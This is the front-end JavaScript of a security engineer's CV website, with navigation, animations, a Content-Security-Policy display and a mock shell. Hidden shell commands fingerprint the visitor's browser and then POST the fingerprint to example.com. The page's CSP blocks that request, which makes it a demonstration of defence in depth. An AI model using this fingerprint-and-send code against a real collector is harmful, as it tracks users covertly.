/* ═══════════════════════════════════════════════════════════════
   talkatz.com

   Progressive enhancement throughout: with JavaScript disabled the
   page is a complete, readable CV. JS adds the scroll-spy, the
   keyboard layer, the shell, the live policy ledger and the rail.
   ═══════════════════════════════════════════════════════════════ */
(function () {
  'use strict';

  var doc = document;
  var root = doc.documentElement;
  var reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

  root.classList.remove('no-js');
  root.classList.add('js');

  /* ── derived career numbers ──────────────────────────────── */

  var START = new Date(2018, 10, 5);           // 2018-11-05, first tech role
  var SEC_START = new Date(2020, 10, 1);       // 2020-11, first security role

  function yearsSince(d) { return (Date.now() - d) / 31557600000; }

  var upYmd = doc.getElementById('upYmd');
  var upClock = doc.getElementById('upClock');
  var kpiYears = doc.getElementById('kpiYears');


  // Calendar-accurate y/m/d — the header states it as fact, so it should
  // survive somebody checking it.
  function breakdown(from, to) {
    var y = to.getFullYear() - from.getFullYear();
    var mo = to.getMonth() - from.getMonth();
    var d = to.getDate() - from.getDate();
    if (d < 0) { mo--; d += new Date(to.getFullYear(), to.getMonth(), 0).getDate(); }
    if (mo < 0) { y--; mo += 12; }
    return { y: y, mo: mo, d: d };
  }

  if (kpiYears) kpiYears.textContent = Math.floor(yearsSince(START)) + '+';

  var upTimer = null, lastUptime = '';
  function pad2(n) { return (n < 10 ? '0' : '') + n; }

  function renderUptime() {
    if (!upYmd) return;
    // y/m/d are calendar-accurate; h:m:s are the elapsed remainder, derived
    // from the same delta rather than read off the visitor's clock. The
    // anchor is a midnight date, so the remainder does coincide with local
    // time-of-day — it is still elapsed time, just numerically identical.
    var b = breakdown(START, new Date());
    var ms = Date.now() - START;
    var ymd = b.y + 'y ' + b.mo + 'm ' + b.d + 'd';
    var clock = '  ' + pad2(Math.floor(ms / 3600000) % 24) + ':' +
      pad2(Math.floor(ms / 60000) % 60) + ':' + pad2(Math.floor(ms / 1000) % 60);
    var txt = ymd + clock;
    if (txt !== lastUptime) {
      upYmd.textContent = ymd;
      if (upClock) upClock.textContent = clock;
      lastUptime = txt;
    }
  }
  renderUptime();
  upTimer = setInterval(renderUptime, 1000);   // ticks regardless of reduced-motion: a frozen clock reads as broken
  doc.addEventListener('visibilitychange', function () {
    if (doc.hidden) { clearInterval(upTimer); upTimer = null; }
    else if (!upTimer) { renderUptime(); upTimer = setInterval(renderUptime, 1000); }
  });

  /* ── bring-up ────────────────────────────────────────────────
     Replaces the old full-screen boot gate. Nothing blocks reading:
     the page is complete on first paint and the status cells simply
     resolve in sequence, inline, over roughly half a second. */

  (function bringUp() {
    var cells = Array.prototype.slice.call(doc.querySelectorAll('.mh-meta > div'));

    if (reduced || !cells.length) return;

    cells.forEach(function (c) { c.classList.add('arming'); });
    cells.forEach(function (c, i) {
      setTimeout(function () {
        c.classList.remove('arming');
        c.classList.add('armed');
      }, 90 + i * 110);
    });

  }());


  /* ── scroll-spy navigation ───────────────────────────────────
     Previously this hid every panel but one, which meant a visitor
     who never clicked saw a single section of a CV. Now everything is
     on one continuous page and the nav reflects where you are rather
     than deciding what exists. */

  var panels = Array.prototype.slice.call(doc.querySelectorAll('.panel'));
  var navBtns = Array.prototype.slice.call(doc.querySelectorAll('#nav button'));
  var IDS = panels.map(function (p) { return p.id; });

  var activeId = null;
  function setActive(id) {
    navBtns.forEach(function (b) { b.classList.toggle('active', b.dataset.go === id); });
    if (id !== activeId) {
      activeId = id;
      doc.dispatchEvent(new CustomEvent('tk:section', { detail: { id: id } }));
    }
  }

  function go(id, opts) {
    opts = opts || {};
    var el = doc.getElementById(id);
    if (!el) return;
    setActive(id);
    if (opts.initial) return;
    el.scrollIntoView({ behavior: reduced ? 'auto' : 'smooth', block: 'start' });
    try { history.replaceState(null, '', '#' + id); } catch (e) {}
  }

  navBtns.forEach(function (b) {
    b.addEventListener('click', function () { go(b.dataset.go); });
  });

  // Highlight whichever section owns the top of the viewport. Driven by
  // scroll position rather than IntersectionObserver: it is deterministic,
  // testable, and does not depend on observer delivery timing.
  var spyTick = null;
  function updateSpy() {
    spyTick = null;
    var probe = 140;                       // just below the sticky nav
    var current = IDS[0];
    for (var i = 0; i < panels.length; i++) {
      if (panels[i].getBoundingClientRect().top <= probe) current = panels[i].id;
    }
    // At the very bottom the last section wins even if it is short.
    if (window.innerHeight + window.scrollY >= doc.documentElement.scrollHeight - 4) {
      current = IDS[IDS.length - 1];
    }
    setActive(current);
  }
  window.addEventListener('scroll', function () {
    if (!spyTick) spyTick = requestAnimationFrame(updateSpy);
  }, { passive: true });
  window.addEventListener('resize', updateSpy);

  // Reveal each panel as it arrives rather than all at once.
  if (!reduced && 'IntersectionObserver' in window) {
    panels.forEach(function (p) { p.classList.add('reveal'); });
    var io = new IntersectionObserver(function (list) {
      list.forEach(function (r) {
        if (r.isIntersecting) {
          r.target.classList.remove('reveal');
          r.target.classList.add('shown');
          io.unobserve(r.target);
        }
      });
    }, { rootMargin: '0px 0px -8% 0px' });
    panels.forEach(function (p) { io.observe(p); });

    // Failsafe. The reveal starts panels at opacity 0, so if the observer
    // never delivers — throttled tab, odd browser, anything — the CV would
    // be permanently invisible. Content must never depend on an animation
    // firing, so force everything visible shortly after load regardless.
    setTimeout(function () {
      panels.forEach(function (p) {
        p.classList.remove('reveal');
        p.classList.add('shown');
      });
    }, 1600);
  } else {
    panels.forEach(function (p) { p.classList.remove('reveal'); p.classList.add('shown'); });
  }

  var fromHash = (location.hash || '').replace('#', '');
  if (IDS.indexOf(fromHash) !== -1) go(fromHash);
  else setActive('overview');

  /* ── keyboard layer ──────────────────────────────────────────
     Bindings borrowed from the tools this audience already lives in —
     vim, less, k9s — so they work on instinct. Nothing here is required
     to use the page; it is capability laid on top.

     Hard rule: never swallow a keystroke while the visitor is typing in
     the console. Only Escape is honoured there, to let them back out. */

  (function keyboard() {
    var overlay = doc.getElementById('keys');
    var closeBtn = doc.getElementById('keysClose');
    var cmd = doc.getElementById('cmd');
    var lastFocus = null;
    var pendingG = 0;

    function typing() {
      var a = doc.activeElement;
      return a && (a.tagName === 'INPUT' || a.tagName === 'TEXTAREA' || a.isContentEditable);
    }

    function openKeys() {
      if (!overlay || !overlay.hidden) return;
      lastFocus = doc.activeElement;
      overlay.hidden = false;
      if (closeBtn) closeBtn.focus();
    }

    function closeKeys() {
      if (!overlay || overlay.hidden) return;
      overlay.hidden = true;
      if (lastFocus && lastFocus.focus) lastFocus.focus();
      lastFocus = null;
    }

    if (closeBtn) closeBtn.addEventListener('click', closeKeys);
    if (overlay) {
      overlay.addEventListener('click', function (e) { if (e.target === overlay) closeKeys(); });
    }

    function currentIndex() {
      var probe = 140, idx = 0;
      for (var i = 0; i < panels.length; i++) {
        if (panels[i].getBoundingClientRect().top <= probe) idx = i;
      }
      return idx;
    }

    function step(delta) {
      var i = Math.max(0, Math.min(panels.length - 1, currentIndex() + delta));
      go(panels[i].id);
    }

    doc.addEventListener('keydown', function (ev) {
      if (ev.metaKey || ev.ctrlKey || ev.altKey) return;

      // Escape is the one key that works from inside the console.
      if (ev.key === 'Escape') {
        if (overlay && !overlay.hidden) { ev.preventDefault(); closeKeys(); return; }
        if (typing()) { doc.activeElement.blur(); return; }
        return;
      }

      if (typing()) return;

      // While the panel is open, only Escape and the close button act.
      if (overlay && !overlay.hidden) {
        if (ev.key === '?') { ev.preventDefault(); closeKeys(); }
        return;
      }

      var k = ev.key;

      if (k === 'g') {                      // gg -> top, within 600ms
        if (pendingG) {
          clearTimeout(pendingG); pendingG = 0;
          ev.preventDefault();
          window.scrollTo({ top: 0, behavior: reduced ? 'auto' : 'smooth' });
        } else {
          pendingG = setTimeout(function () { pendingG = 0; }, 600);
        }
        return;
      }
      if (pendingG) { clearTimeout(pendingG); pendingG = 0; }

      if (k === 'j') { ev.preventDefault(); step(1); }
      else if (k === 'k') { ev.preventDefault(); step(-1); }
      else if (k === 'G') {
        ev.preventDefault();
        window.scrollTo({ top: doc.documentElement.scrollHeight, behavior: reduced ? 'auto' : 'smooth' });
      }
      else if (k === '/') {
        // preventDefault stops the "/" landing in the field we just focused
        ev.preventDefault();
        if (cmd) { go('console'); cmd.focus(); }
      }
      else if (k === '?') { ev.preventDefault(); openKeys(); }
      else if (k >= '1' && k <= '6') {
        var n = +k - 1;
        if (panels[n]) { ev.preventDefault(); go(panels[n].id); }
      }
    });
  }());

  /* ── email ───────────────────────────────────────────────── */

  // Every .mail link, not just the first — the address is split across
  // data-* attributes so scrapers reading the raw HTML come away empty.
  var ADDRESS = 'hi@talkatz.com';
  doc.querySelectorAll('.mail').forEach(function (el) {
    ADDRESS = el.dataset.u + '@' + el.dataset.d;
    el.href = 'mailto:' + ADDRESS;
    el.textContent = ADDRESS;
  });

  /* ── CSP violation recorder ──────────────────────────────────
     Registered before anything can trip it, so `exfil` reports the real
     directive rather than asserting a block it never observed. */

  var lastViolation = null;
  doc.addEventListener('securitypolicyviolation', function (e) {
    lastViolation = { directive: e.effectiveDirective || e.violatedDirective, blocked: e.blockedURI };
  });

  /* ── pointer: mouse as a monitored process ───────────────────
     The OS arrow is replaced by a crosshair plus a live telemetry panel
     — velocity sparkline, measured frame rate, and a session pid. */

  (function pointer() {
    var el = doc.getElementById('ptr');
    if (!el || reduced) return;
    /* Must match the query that hides #ptr in CSS. Gating on hover alone let
       a hover-capable coarse-pointer device (mouse on Android, Samsung DeX,
       some touch laptops) run this module, hide the OS cursor via .cursorless,
       and then have CSS hide the crosshair meant to replace it — leaving the
       visitor with no pointer at all. */
    if (!window.matchMedia('(hover: hover) and (pointer: fine)').matches) return;

    var mark = el.querySelector('.ptr-mark');
    var cv = doc.getElementById('ptrSpark');
    var pidEl = doc.getElementById('ptrPid');
    var fpsEl = doc.getElementById('ptrFps');
    var velEl = doc.getElementById('ptrVel');
    if (!cv || !mark) return;

    // Stable for the life of the tab, like a real process id.
    var pid = 1000 + Math.floor(Math.random() * 8999);
    pidEl.textContent = String(pid);

    var ctx = cv.getContext('2d');
    var dpr = Math.min(window.devicePixelRatio || 1, 2);
    cv.width = 76 * dpr; cv.height = 20 * dpr;
    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);

    var HIST = 38;
    var hist = new Array(HIST).fill(0);

    var x = 0, y = 0, px = 0, py = 0, lastT = 0, lastMoveT = 0;
    var vel = 0, velEMA = 0, fps = 60, raf = null, seen = false;
    var frames = 0, fpsClock = 0;

    function spark(peak) {
      ctx.clearRect(0, 0, 76, 20);
      // Grid baseline so the panel reads as an instrument, not a doodle.
      ctx.strokeStyle = 'rgba(42,42,49,.95)';
      ctx.beginPath(); ctx.moveTo(0, 19.5); ctx.lineTo(76, 19.5); ctx.stroke();

      var max = Math.max(peak, 1);
      ctx.beginPath();
      for (var i = 0; i < HIST; i++) {
        var h = Math.min(1, hist[i] / max) * 17;
        var bx = i * 2;
        ctx.moveTo(bx, 19);
        ctx.lineTo(bx, 19 - h);
      }
      ctx.strokeStyle = velEMA > max * 0.55 ? 'rgba(255,59,48,.95)' : 'rgba(255,255,255,.8)';
      ctx.lineWidth = 1.4;
      ctx.stroke();
    }

    function loop(t) {
      if (!lastT) lastT = t;
      var dt = t - lastT;
      lastT = t;

      frames++;
      fpsClock += dt;
      if (fpsClock >= 500) {
        fps = Math.round(frames * 1000 / fpsClock);
        fpsEl.textContent = String(Math.min(fps, 999));
        frames = 0; fpsClock = 0;
      }

      // Decay velocity so the readout falls back to rest when still.
      velEMA += (vel - velEMA) * 0.35;
      vel *= 0.90;

      hist.push(velEMA);
      if (hist.length > HIST) hist.shift();

      var peak = 0;
      for (var i = 0; i < hist.length; i++) if (hist[i] > peak) peak = hist[i];
      spark(Math.max(peak, 400));

      velEl.textContent = Math.round(velEMA) + '/s';
      el.classList.toggle('busy', velEMA > 900);

      el.style.transform = 'translate3d(' + x.toFixed(1) + 'px,' + y.toFixed(1) + 'px,0)';
      raf = requestAnimationFrame(loop);
    }

    window.addEventListener('mousemove', function (e) {
      var now = performance.now();
      if (seen && lastMoveT) {
        var dt = Math.max(now - lastMoveT, 8);
        var dx = e.clientX - px, dy = e.clientY - py;
        vel = Math.min(6000, Math.sqrt(dx * dx + dy * dy) / dt * 1000);
      }
      lastMoveT = now;
      px = e.clientX; py = e.clientY;
      x = e.clientX; y = e.clientY;

      // Keep the panel on screen near the right and bottom edges.
      el.classList.toggle('flip-x', e.clientX > window.innerWidth - 170);
      el.classList.toggle('flip-y', e.clientY > window.innerHeight - 110);

      if (!seen) {
        seen = true;
        root.classList.add('cursorless');
        el.classList.add('on');
        if (!raf) raf = requestAnimationFrame(loop);
      }
    }, { passive: true });

    function halt() {
      el.classList.remove('on');
      if (raf) { cancelAnimationFrame(raf); raf = null; }
      lastT = 0; lastMoveT = 0;
    }

    doc.addEventListener('mouseleave', halt);
    doc.addEventListener('mouseenter', function () {
      if (!seen) return;
      el.classList.add('on');
      if (!raf) raf = requestAnimationFrame(loop);
    });
    doc.addEventListener('visibilitychange', function () {
      if (doc.hidden) halt();
      else if (seen && !raf) { el.classList.add('on'); raf = requestAnimationFrame(loop); }
    });
  }());

  /* ── background: drifting security graph ─────────────────────
     Nodes drift slowly and grow edges to whichever neighbours are close
     enough, dropping them again as they separate. Occasionally a node
     flares, the way one asset lights up when a detection fires on it.

     Node spacing is deliberately kept well inside LINK — at lower
     densities the mean nearest-neighbour distance lands right at the
     link threshold, every pair sits at alpha zero, and the mesh never
     visibly forms. O(n^2) edge test, but n is capped low enough that it
     stays trivial. */

  (function fx() {
    var cv = doc.getElementById('fx');
    if (!cv || reduced) return;

    var ctx = cv.getContext('2d');
    var nodes = [], w = 0, h = 0, raf = null;
    var LINK = 190;
    var MAX_NODES = 92;

    function size() {
      var dpr = Math.min(window.devicePixelRatio || 1, 2);
      var nw = cv.clientWidth, nh = cv.clientHeight;
      /* Mobile browsers fire resize when the URL bar collapses during scroll.
         Reseeding on that teleports all 92 nodes while someone is reading, so
         only a real width change — or a height change too large to be a
         toolbar — earns a fresh layout. The backing store rescales either. */
      var reflow = !nodes.length || Math.abs(nw - w) > 2 || Math.abs(nh - h) > 120;
      w = nw; h = nh;
      cv.width = w * dpr; cv.height = h * dpr;
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
      if (reflow) seed();
    }

    function seed() {
      var n = Math.max(14, Math.min(MAX_NODES, Math.round(w * h / 13500)));
      nodes = [];
      for (var i = 0; i < n; i++) {
        nodes.push({
          x: Math.random() * w,
          y: Math.random() * h,
          vx: (Math.random() - 0.5) * 0.22,
          vy: (Math.random() - 0.5) * 0.22,
          hub: Math.random() < 0.16,
          flare: 0
        });
      }
    }

    function draw() {
      ctx.clearRect(0, 0, w, h);

      ctx.lineWidth = 1;
      for (var i = 0; i < nodes.length; i++) {
        var a = nodes[i];
        for (var j = i + 1; j < nodes.length; j++) {
          var b = nodes[j];
          var dx = a.x - b.x, dy = a.y - b.y;
          var d2 = dx * dx + dy * dy;
          if (d2 > LINK * LINK) continue;
          var t = 1 - Math.sqrt(d2) / LINK;
          var alpha = t * t * 0.5;
          var hot = a.flare > 0 || b.flare > 0;
          ctx.strokeStyle = hot
            ? 'rgba(255,59,48,' + (alpha + 0.2).toFixed(3) + ')'
            : 'rgba(255,255,255,' + alpha.toFixed(3) + ')';
          ctx.beginPath();
          ctx.moveTo(a.x, a.y);
          ctx.lineTo(b.x, b.y);
          ctx.stroke();
        }
      }

      for (var k = 0; k < nodes.length; k++) {
        var p = nodes[k];

        p.x += p.vx; p.y += p.vy;
        // wrap rather than bounce, so the field never develops visible walls
        if (p.x < -20) p.x = w + 20; else if (p.x > w + 20) p.x = -20;
        if (p.y < -20) p.y = h + 20; else if (p.y > h + 20) p.y = -20;

        if (p.flare > 0) p.flare -= 0.012;
        else if (Math.random() < 0.00035) p.flare = 1;

        var r = p.hub ? 2.1 : 1.3;
        if (p.flare > 0) {
          ctx.fillStyle = 'rgba(255,59,48,' + (0.35 + p.flare * 0.6).toFixed(3) + ')';
          ctx.beginPath();
          ctx.arc(p.x, p.y, r + p.flare * 3.4, 0, 6.2832);
          ctx.fill();
        }
        ctx.fillStyle = p.hub ? 'rgba(255,255,255,.9)' : 'rgba(255,255,255,.55)';
        ctx.beginPath();
        ctx.arc(p.x, p.y, r, 0, 6.2832);
        ctx.fill();
      }

      raf = requestAnimationFrame(draw);
    }

    function start() { if (!raf) raf = requestAnimationFrame(draw); }
    function stop() { if (raf) { cancelAnimationFrame(raf); raf = null; } }

    size(); start();

    var rt = null;
    window.addEventListener('resize', function () { clearTimeout(rt); rt = setTimeout(size, 150); });
    doc.addEventListener('visibilitychange', function () { doc.hidden ? stop() : start(); });
  }());

  /* ── policy ledger ───────────────────────────────────────────
     Renders the page's actual Content-Security-Policy by parsing the
     meta tag rather than restating it, so the display cannot drift
     from what is enforced. Then logs every refusal the browser
     actually makes. Replaces a decorative canvas with real data. */

  (function ledger() {
    var dirEl = doc.getElementById('lgDir');
    var logEl = doc.getElementById('lgLog');
    var countEl = doc.getElementById('lgCount');
    if (!dirEl || !logEl) return;

    var meta = doc.querySelector('meta[http-equiv="Content-Security-Policy"]');
    var policy = meta ? meta.getAttribute('content') : '';

    policy.split(';').forEach(function (part) {
      part = part.trim();
      if (!part) return;
      var sp = part.indexOf(' ');
      var name = sp === -1 ? part : part.slice(0, sp);
      var val = sp === -1 ? '' : part.slice(sp + 1);
      var li = doc.createElement('li');
      var b = doc.createElement('b');
      b.textContent = name + ' ';
      li.appendChild(b);
      li.appendChild(doc.createTextNode(val));
      dirEl.appendChild(li);
    });

    var refusals = 0;
    doc.addEventListener('securitypolicyviolation', function (e) {
      refusals++;
      if (countEl) countEl.textContent = String(refusals);
      var none = logEl.querySelector('.lg-none');
      if (none) none.remove();
      var d = new Date();
      function p2(n) { return (n < 10 ? '0' : '') + n; }
      var li = doc.createElement('li');
      li.textContent = p2(d.getHours()) + ':' + p2(d.getMinutes()) + ':' + p2(d.getSeconds()) +
        '  refused ' + (e.effectiveDirective || e.violatedDirective);
      logEl.insertBefore(li, logEl.firstChild);
      while (logEl.children.length > 6) logEl.removeChild(logEl.lastChild);
    });
  }());

  /* ── left rail ────────────────────────────────────────────── */

  (function rail() {
    var ord = doc.getElementById('railOrd');
    var sec = doc.getElementById('railSec');
    if (!ord || !sec) return;
    doc.addEventListener('tk:section', function (e) {
      var i = IDS.indexOf(e.detail.id);
      if (i === -1) return;
      ord.textContent = (i < 9 ? '0' : '') + (i + 1);
      sec.textContent = e.detail.id;
    });
  }());

  /* ── shell ───────────────────────────────────────────────── */

  (function shell() {
    var out = doc.getElementById('shellOut');
    var input = doc.getElementById('cmd');
    if (!out || !input) return;

    var hist = [], hIdx = -1, unlocked = false, fingerprint = null;

    function print(t, cls) {
      var d = doc.createElement('div');
      if (cls) d.className = cls;
      d.textContent = t;
      out.appendChild(d);
      out.scrollTop = out.scrollHeight;
    }
    function printAll(a, cls) { a.forEach(function (l) { print(l, cls); }); }
    function rule() { print('─'.repeat(48), 'dim'); }

    function fnv1a(str) {
      var h = 0x811c9dc5;
      for (var i = 0; i < str.length; i++) {
        h ^= str.charCodeAt(i);
        h = (h + ((h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24))) >>> 0;
      }
      return ('00000000' + h.toString(16)).slice(-8);
    }

    function canvasHash() {
      try {
        var c = doc.createElement('canvas');
        c.width = 220; c.height = 40;
        var x = c.getContext('2d');
        x.textBaseline = 'top'; x.font = '14px "Arial"';
        x.fillStyle = '#f60'; x.fillRect(0, 0, 90, 20);
        x.fillStyle = '#069'; x.fillText('talkatz.com ☀ fingerprint', 2, 4);
        return fnv1a(c.toDataURL());
      } catch (e) { return 'unavailable'; }
    }

    function collect() {
      var n = navigator, s = screen;
      var sig = [
        ['screen', s.width + '×' + s.height + ' @' + (window.devicePixelRatio || 1) + 'x'],
        ['viewport', window.innerWidth + '×' + window.innerHeight],
        ['colorDepth', s.colorDepth + '-bit'],
        ['timezone', Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown'],
        ['languages', (n.languages || [n.language]).join(', ')],
        ['platform', (n.userAgentData && n.userAgentData.platform) || n.platform || 'unknown'],
        ['cpuThreads', String(n.hardwareConcurrency || 'undisclosed')],
        ['deviceMemory', n.deviceMemory ? n.deviceMemory + ' GB' : 'undisclosed'],
        ['touchPoints', String(n.maxTouchPoints || 0)],
        ['colorScheme', matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'],
        ['reducedMotion', reduced ? 'yes' : 'no'],
        ['canvasHash', canvasHash()]
      ];
      return { signals: sig, id: fnv1a(sig.map(function (p) { return p[1]; }).join('|')) };
    }

    var C = {
      help: function () {
        printAll([
          'whoami          who you are talking to',
          'alerts          work history, newest first',
          'detections      things I built',
          'skills          skill tree',
          'certs           unlocks',
          'contact         how to reach me',
          'goto <section>  ' + IDS.join('|'),
          'ls, cat <file>  look around',
          'clear           clear this output'
        ], 'dim');
      },
      whoami: function () {
        print('tal katz — senior security engineer, wiz (google)', 'acc');
        print('detection engineering · security automation · incident response', 'dim');
      },
      alerts: function () {
        printAll([
          '2024-08 → present   Senior Security Engineer    Wiz (Google)   [ACTIVE]',
          '2022-09 → 2024-08   Security Operations Eng     Axonius',
          '2021-11 → 2022-09   Security Operations Eng     Cellebrite',
          '2020-11 → 2021-11   Threat Operations Analyst   Cellebrite',
          '2018-11 → 2020-11   IT Support Specialist       Cellebrite'
        ]);
      },
      detections: function () {
        var n = doc.querySelectorAll('#detections .op-row .what b');
        if (!n.length) return print('no ops data', 'err');
        n.forEach(function (h) { print('· ' + h.textContent.trim()); });
      },
      skills: function () {
        var rows = doc.querySelectorAll('#coverage .tools .row');
        if (!rows.length) return print('no toolset data', 'err');
        rows.forEach(function (r) {
          print(r.querySelector('.what').textContent.trim(), 'acc');
          print('  ' + r.querySelector('.desc').textContent.trim(), 'dim');
        });
      },
      certs: function () {
        printAll([
          'GIAC OSINT (GOSI) — SANS, 2024',
          'Ethical Hacker — See Security College, 2022 (top of cohort)',
          'Python Master — iNT, 2019',
          'MCSA + CCNA — John Bryce, 2019',
          'Combat Medic — IDF, 2015'
        ]);
      },
      contact: function () {
        print('email     ' + ADDRESS, 'acc');
        print('linkedin  linkedin.com/in/tal-katz-283262159', 'acc');
      },
      goto: function (arg) {
        if (IDS.indexOf(arg) === -1) return print('usage: goto <' + IDS.join('|') + '>', 'err');
        go(arg, { scroll: true });
        print('→ ' + arg, 'ok');
      },
      ls: function () { print('identity  alerts  detections  skills  certs  contact  .well-known/', 'dim'); },
      cat: function (arg) {
        if (!arg) return print('usage: cat <file>', 'err');
        var FILES = { identity: 'whoami', alerts: 'alerts', detections: 'detections', skills: 'skills', certs: 'certs', contact: 'contact' };
        if (arg.indexOf('.well-known') === 0) return print('Contact: mailto:' + ADDRESS, 'dim');
        if (Object.prototype.hasOwnProperty.call(FILES, arg)) return C[FILES[arg]]();
        print('cat: ' + arg + ': no such file or directory', 'err');
      },
      clear: function () { out.textContent = ''; },

      /* hidden */
      detect: function () {
        rule();
        print('▌ READING FROM YOUR BROWSER', 'hdr');
        print('  Nothing below is transmitted. Collected locally, shown to', 'dim');
        print('  you, discarded when you close the tab.', 'dim');
        rule();
        var t0 = performance.now();
        fingerprint = collect();
        var ms = (performance.now() - t0).toFixed(1);
        fingerprint.signals.forEach(function (p) { print('  ' + p[0].padEnd(15) + p[1]); });
        rule();
        print('  compound id   ' + fingerprint.id, 'warn');
        print('  ' + fingerprint.signals.length + ' signals in ' + ms + ' ms. Network tab is empty.', 'dim');
        print('');
        print('  Every site can do this, and most do it without saying so.', 'ok');
        print('  The interesting question is what stops them.', 'ok');
        print('');
        print('  Now try: exfil', 'acc');
        unlocked = true;
      },

      exfil: function () {
        if (!unlocked || !fingerprint) return print('exfil: nothing collected yet', 'err');
        print('Attempting to POST your fingerprint off-origin...', 'dim');
        lastViolation = null;

        // INVARIANT: safe only while this page ships `connect-src 'none'`.
        // Adding ANY connect-src origin turns this into working exfiltration.
        // Delete this command before relaxing the policy. example.com is
        // IANA-reserved, so there is no collector on the other end either.
        fetch('https://example.com/collect', {
          method: 'POST', mode: 'no-cors', body: JSON.stringify(fingerprint)
        }).then(function () {
          print('Request completed. That should not have happened.', 'err');
        }).catch(function (err) {
          setTimeout(function () {
            rule();
            print('▌ BLOCKED', 'hdr');
            if (lastViolation) {
              print('  directive   ' + lastViolation.directive, 'ok');
              print('  blocked     ' + lastViolation.blocked, 'ok');
            }
            print('  error       ' + (err && err.message ? err.message : String(err)), 'dim');
            rule();
            if (lastViolation) {
              print('  A real request to a real origin, refused by this page\'s', 'dim');
              print('  own Content-Security-Policy. Not a mock.', 'dim');
              print('');
              print('  connect-src \'none\' is why it stayed here.', 'acc');
            } else {
              print('  It failed before leaving the browser, but no CSP violation', 'dim');
              print('  was captured — not claiming a block I cannot show.', 'dim');
            }
            print('');
            print('  Defence in depth is mostly deciding, in advance, what your', 'ok');
            print('  own page is not allowed to do.', 'ok');
          }, 60);
        });
      },

      sudo: function () { print('tal is not in the sudoers file. This incident has been reported.', 'err'); },
      nmap: function () {
        printAll(['Starting Nmap — scanning talkatz.com', 'PORT     STATE  SERVICE',
                  '443/tcp  open   https', 'Nmap done: 1 host up, 1 service.'], 'dim');
      },
      rm: function () { print('no.', 'err'); },

      /* aliases from the previous framing */
      missions: function () { C.alerts(); },
      ops: function () { C.detections(); },
      exit: function () { print('There is no exit. Only the terminal.', 'dim'); }
    };

    // Own-property check only — a bare C[cmd] would resolve inherited
    // members such as `constructor` and try to call them.
    function has(n) { return Object.prototype.hasOwnProperty.call(C, n); }

    function run(raw) {
      var parts = raw.trim().split(/\s+/);
      var cmd = (parts.shift() || '').toLowerCase();
      if (!cmd) return;
      print('tal@talkatz:~$ ' + raw, 'echo');
      if (cmd === 'exfil' && !unlocked) return print('exfil: command not found — try `help`', 'err');
      if (has(cmd)) C[cmd](parts[0]);
      else print(cmd + ': command not found — try `help`', 'err');
    }

    input.addEventListener('keydown', function (ev) {
      if (ev.key === 'Enter') {
        var v = input.value;
        if (v.trim()) { hist.push(v); hIdx = hist.length; }
        run(v);
        input.value = '';
      } else if (ev.key === 'ArrowUp') {
        if (!hist.length) return;
        ev.preventDefault();
        hIdx = Math.max(0, hIdx - 1);
        input.value = hist[hIdx];
      } else if (ev.key === 'ArrowDown') {
        if (!hist.length) return;
        ev.preventDefault();
        hIdx = Math.min(hist.length, hIdx + 1);
        input.value = hist[hIdx] || '';
      }
    });

    print('talkatz.sh — type `help` to start.', 'dim');
  }());

}());
